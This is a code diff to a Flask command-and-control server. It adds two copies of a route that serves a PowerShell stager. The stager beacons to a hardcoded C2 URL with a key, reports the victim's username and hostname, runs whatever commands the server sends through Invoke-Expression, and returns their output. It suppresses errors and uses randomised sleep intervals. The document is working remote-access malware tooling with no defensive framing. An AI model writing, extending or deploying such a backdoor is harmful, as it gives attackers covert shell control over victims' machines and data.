@@ -222,6 +222,31 @@ def c2():
                 "pending_tasks": pending
             })
 
+
+        if route == "ps_agent":
+            stager = (
+                "$ErrorActionPreference='SilentlyContinue'\\n"
+                "$u='https://shadow-c2-server.onrender.com/functions/c2Server'\\n"
+                "$k='Youssef123'\\n"
+                "$id=[System.Guid]::NewGuid().ToString()\\n"
+                "while($true){\\n"
+                "  try{\\n"
+                "    $b=[Text.Encoding]::UTF8.GetBytes((@{route='checkin';key=$k;id=$id;os='Windows';user=$env:USERNAME;hostname=$env:COMPUTERNAME;ip='0.0.0.0';arch='x64'}|ConvertTo-Json))\\n"
+                "    $r=[Net.WebRequest]::Create($u+'?route=checkin');$r.Method='POST';$r.ContentType='application/json';$r.ContentLength=$b.Length\\n"
+                "    $s=$r.GetRequestStream();$s.Write($b,0,$b.Length);$s.Close()\\n"
+                "    $d=(New-Object IO.StreamReader($r.GetResponse().GetResponseStream())).ReadToEnd()|ConvertFrom-Json\\n"
+                "    if($d.action -eq 'shell'){\\n"
+                "      $o=Invoke-Expression $d.args.cmd 2>&1|Out-String\\n"
+                "      $rb=[Text.Encoding]::UTF8.GetBytes((@{route='result';key=$k;task_id=$d.task_id;output=$o}|ConvertTo-Json))\\n"
+                "      $r2=[Net.WebRequest]::Create($u+'?route=result');$r2.Method='POST';$r2.ContentType='application/json';$r2.ContentLength=$rb.Length\\n"
+                "      $s2=$r2.GetRequestStream();$s2.Write($rb,0,$rb.Length);$s2.Close();$r2.GetResponse()|Out-Null\\n"
+                "    }\\n"
+                "  }catch{}\\n"
+                "  Start-Sleep -Seconds (Get-Random -Minimum 5 -Maximum 15)\\n"
+                "}\\n"
+            )
+            return stager, 200, {"Content-Type": "text/plain"}
+
     return jsonify({"error": "unknown route"}), 404
 
 
@@ -241,3 +266,29 @@ def health():
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 8080))
     app.run(host="0.0.0.0", port=port, debug=False)
+
+
+@app.route("/ps_agent", methods=["GET"])
+def ps_agent():
+    stager = (
+        "$ErrorActionPreference='SilentlyContinue'\\n"
+        "$u='https://shadow-c2-server.onrender.com/functions/c2Server'\\n"
+        "$k='Youssef123'\\n"
+        "$id=[System.Guid]::NewGuid().ToString()\\n"
+        "while($true){\\n"
+        "  try{\\n"
+        "    $b=[Text.Encoding]::UTF8.GetBytes((@{route='checkin';key=$k;id=$id;os='Windows';user=$env:USERNAME;hostname=$env:COMPUTERNAME;ip='0.0.0.0';arch='x64'}|ConvertTo-Json))\\n"
+        "    $r=[Net.WebRequest]::Create($u+'?route=checkin');$r.Method='POST';$r.ContentType='application/json';$r.ContentLength=$b.Length\\n"
+        "    $s=$r.GetRequestStream();$s.Write($b,0,$b.Length);$s.Close()\\n"
+        "    $d=(New-Object IO.StreamReader($r.GetResponse().GetResponseStream())).ReadToEnd()|ConvertFrom-Json\\n"
+        "    if($d.action -eq 'shell'){\\n"
+        "      $o=Invoke-Expression $d.args.cmd 2>&1|Out-String\\n"
+        "      $rb=[Text.Encoding]::UTF8.GetBytes((@{route='result';key=$k;task_id=$d.task_id;output=$o}|ConvertTo-Json))\\n"
+        "      $r2=[Net.WebRequest]::Create($u+'?route=result');$r2.Method='POST';$r2.ContentType='application/json';$r2.ContentLength=$rb.Length\\n"
+        "      $s2=$r2.GetRequestStream();$s2.Write($rb,0,$rb.Length);$s2.Close();$r2.GetResponse()|Out-Null\\n"
+        "    }\\n"
+        "  }catch{}\\n"
+        "  Start-Sleep -Seconds (Get-Random -Minimum 5 -Maximum 15)\\n"
+        "}\\n"
+    )
+    return stager, 200, {"Content-Type": "text/plain"}
